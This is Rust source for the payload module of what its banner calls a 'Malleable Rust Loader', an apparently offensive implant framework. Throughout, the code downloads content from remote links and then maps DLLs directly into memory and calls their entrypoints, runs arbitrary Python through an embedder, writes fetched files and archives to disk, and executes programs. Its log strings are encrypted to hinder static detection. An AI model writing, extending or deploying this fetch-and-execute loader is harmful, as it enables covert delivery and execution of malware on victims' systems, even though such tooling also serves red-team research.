#[cfg(target_os = "windows")]
use std::os::raw::c_int;
#[cfg(target_os = "windows")]
type DllEntryPoint = extern "C" fn() -> c_int;
#[cfg(target_os = "windows")]
use std::mem;

use serde::{Deserialize, Serialize};

use std::io::Cursor;
use std::path::PathBuf;
use std::process::Command;
use std::{thread, time};

#[cfg(target_os = "windows")]
use crate::python_embedder;

use log::debug;
use log::error;
use log::info;

use std::io::stdout;
use std::io::Write;

use crate::link::{Link, LinkFetch};
use crate::config::Config;

use cryptify::encrypt_string;

use anyhow::Result;

use std::fs::File;

use crate::payload_util::calculate_path;
use crate::payload_util::create_diretory;
#[cfg(target_os = "linux")]
use crate::payload_util::fail_linux_message;
use crate::payload_util::same_hash_sha512;
#[cfg(target_os = "linux")]
use crate::payload_util::set_permission;

pub enum PayloadExec {
    NoThread(),
    Thread(thread::JoinHandle<()>, Payload),
}

#[derive(PartialEq)]
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Payload {
    DllFromMemory(DllFromMemory),
    ExecPython(ExecPython),
    Banner(),
    WriteZip(WriteZip),
    WriteFile(WriteFile),
    Exec(Exec),
}
impl Payload {
    pub fn exec_payload(&self,config:&Config) -> PayloadExec {
        let exec_result = match &self {
            Payload::Banner() => banner(),
            Payload::WriteFile(payload) => payload.write_file(config),
            Payload::WriteZip(payload) => payload.write_zip(config),
            Payload::Exec(payload) => payload.exec_file(),
            Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
            Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
        };
        match exec_result {
            Ok(a) => a,
            Err(e) => {
                error!("{}{}", encrypt_string!("exec error: "), e);
                PayloadExec::NoThread()
            }
        }
    }
    pub fn print_payload(&self) {
        debug!("{:#?}", self);
    }
    pub fn print_payload_compact(&self) {
        debug!("+{:?}", self);
    }
    pub fn string_payload_compact(&self) -> String {
        format!("{:?}", self)
    }
    pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
        let self_serialized = serde_json::to_string(self).unwrap();
        let other_serialized = serde_json::to_string(other_payload).unwrap();
        self_serialized == other_serialized
    }
    pub fn is_already_running(
        &self,
        running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>,
    ) -> bool {
        for running_payload in &mut *running_thread {
            if self.is_same_payload(&running_payload.1) {
                info!("{}", encrypt_string!("Payload is already running"));
                return true;
            }
        }
        return false;
    }
}

#[derive(PartialEq)]
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DllFromMemory {
    pub link: Link,
    pub dll_entrypoint: String,
    pub thread: bool,
}

impl DllFromMemory {
    #[cfg(target_os = "linux")]
    pub fn dll_from_memory(&self,_config:&Config) -> Result<PayloadExec, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
        Ok(PayloadExec::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn dll_from_memory(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let thread_dll_entrypoint = self.dll_entrypoint.clone();
            let dllthread = thread::spawn(move || {
                let dll_data: &[u8] = &data;

                info!("{}", encrypt_string!("Map DLL in memory"));
                let mm = memorymodule_rs::MemoryModule::new(dll_data);

                info!(
                    "{}{}",
                    encrypt_string!("Retreive DLL entrypoint: "),
                    &thread_dll_entrypoint
                );
                let dll_entry_point = unsafe {
                    mem::transmute::<_, DllEntryPoint>(mm.get_function(&thread_dll_entrypoint))
                };
                info!("{}", encrypt_string!("dll_entry_point()"));

                let result = dll_entry_point();
                debug!("{}{}", encrypt_string!("DLL result = "), result);
            });
            return Ok(PayloadExec::Thread(
                dllthread,
                Payload::DllFromMemory(self.clone()),
            ));
        } else {
            let dll_data: &[u8] = &data;
            info!("{}", encrypt_string!("Map DLL in memory"));
            let mm = memorymodule_rs::MemoryModule::new(dll_data);

            info!(
                "{}{}",
                encrypt_string!("Retreive DLL entrypoint: "),
                &self.dll_entrypoint
            );
            let dll_entry_point = unsafe {
                mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint))
            };
            info!("{}", encrypt_string!("dll_entry_point()"));

            let result = dll_entry_point();
            debug!("{}{}", encrypt_string!("DLL result = "), result);
            return Ok(PayloadExec::NoThread());
        }
        // TODO quand on part d'ici, il y a un probleme
    }
}

#[derive(PartialEq)]
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ExecPython {
    pub path: String, //path of python directory
    pub python_code: String,
    pub thread: bool,
}
impl ExecPython {
    #[cfg(target_os = "linux")]
    pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
        Ok(PayloadExec::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
        //use crate::python_embedder;

        let path: PathBuf = calculate_path(&self.path)?;

        info!(
            "{}{}\n",
            encrypt_string!("execute python with Embedder: "),
            &self.python_code
        );
        if self.thread {
            let thread_python_path = path.clone();
            let thread_python_code = self.python_code.clone();
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                python_embedder::embedder(&thread_python_path, &thread_python_code);
            });
            return Ok(PayloadExec::Thread(tj, Payload::ExecPython(self.clone())));
        } else {
            python_embedder::embedder(&path, &self.python_code);
            return Ok(PayloadExec::NoThread());
        }
    }
}

pub fn banner() -> Result<PayloadExec, anyhow::Error> {
    //TODO encrypt this str
    let banner: &str = r#"
                                 ╓╖
                         , ▒╗,  ▒▒▒▒╖   ╓▒▒
  Malleable                ░░▒▒▒╖▒▒▒▒╣╣╖▒▒▒┐
 ┬─┐┬ ┬┌─┐┌┬┐        ▒▒@▒╓▒░░░░░░▒▒▒▒▒▒▒▒▒╢▓╖╓╓╖H┐
 ├┬┘│ │└─┐ │          ▒░░░░▒``▒░░░░░▒▒▒▒▒▒╢▒╢╢▒▒░`
 ┴└─└─┘└─┘ ┴   ,╓╓╓╥           ░░░░░░░▒▒▒▒▒▒▒▒▒╢╢
   LOADER      `  ▒`               ░░░░▒▒▒▒▒▒▒╢╢▒╣▒ÑH╗
                          ,▄       ░░░▒▒▒▒▒▒▒╢▒▒▒╢▒▒▒╜
               ╓╖       ╓  ██     ░▓``██▒▒▒▒▒▒▒╢▒╢╣╣
                │       █████▌   ░▐█,▄███▒▒░░▒▒▒▒╢╢╢@╖
                ╙▒      └███▀     └█████▌Ñ░░░▒▒▒▒╢╢╣▒▒░╣
                 .¿          ▄▄▄▄▄▄░"▀▀ `░░░▒▒╫╣╢╢╢╢╣╣╓▒▒
                     :``  ,, ╙████▀   ,  ░╫╬Ñ╜▒▒▒▒▒╣╢╫@▒╙▓╖
               ,░      ▒╢╫╢╢▓▒╜H   ░  ╨╨╜╙╙░  '▒▒╢▒▒▒╢▒╣▓▒▓▓╖
                  ▒ ░  ▒╙╢╢╢╢▓,               ` ░▒▒╢▒▒▒╢▒▓░╙╢N
               └╜▒▒@@  '░▒╢╣╢╢╣@,           ╓░▒ ▒░▒▒╢▒▒╣▒╢╣ ╙╙▒
                      ╙ ▒░▒╢╢╣╢▓╢╗              ▒╙░░▒╢▒╢╜╨╢▒
                        ╙▒░▒╢▒╣╣╣╨          ░ `  ░▒░║╣╢╜   `
                          "╨▒╜╢╢Ñ                  ░▒╜
                                                 ``a "#;

    info!("{}", encrypt_string!("BANNER"));
    let sleep_time = time::Duration::from_millis(3);
    for c in banner.chars() {
        print!("{}", c);
        let _ = stdout().flush();
        thread::sleep(sleep_time);
    }
    println!("");
    let sleep_time = time::Duration::from_millis(3000);
    thread::sleep(sleep_time);
    Ok(PayloadExec::NoThread())
}

#[derive(PartialEq)]
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WriteZip {
    pub link: Link,
    pub path: String,
}

impl WriteZip {
    pub fn write_zip(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
        //TODO found a way, not to recreate everything every time this payload run
        let path: PathBuf = calculate_path(&self.path)?;
        let _ = create_diretory(&path)?;

        let archive: Vec<u8> = self.link.fetch_data(config)?;

        info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
        match zip_extract::extract(Cursor::new(archive), &path, true) {
            Ok(_) => {}
            Err(error) => {
                error!(
                    "{}{}",
                    encrypt_string!("error to unzip python lib: "),
                    error
                )
            }
        }

        Ok(PayloadExec::NoThread())
    }
}

#[derive(PartialEq)]
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WriteFile {
    pub link: Link,
    pub path: String,
    pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
}

impl WriteFile {
    pub fn write_file(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;

        if same_hash_sha512(&self.hash, &path) == false {
            let _ = create_diretory(&path)?;

            let body: Vec<u8> = self.link.fetch_data(config)?;

            info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
            let mut f = File::create(&path)?;
            f.write_all(&body)?;
        } else {
            info!("{}{:?}", encrypt_string!("[+] No Write, same hash: "), path);
        }
        Ok(PayloadExec::NoThread())
    }
}

#[derive(PartialEq)]
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Exec {
    pub path: String,
    pub cmdline: String,
    pub thread: bool,
}
impl Exec {
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self) -> Result<PayloadExec, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;
        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
        let mut comm = Command::new(&path);

        #[cfg(target_os = "linux")]
        set_permission(&path);

        for i in self.cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        if self.thread {
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                let mut c = comm
                    .spawn()
                    .expect(&encrypt_string!("failed to execute process"));
                let _ = c.wait();
            });
            return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
        } else {
            let _output: std::process::Output = comm
                .output()
                .expect(&encrypt_string!("failed to execute process"));
            //let _hello: Vec<u8> = output.stdout;
            return Ok(PayloadExec::NoThread());
        };
    }
}
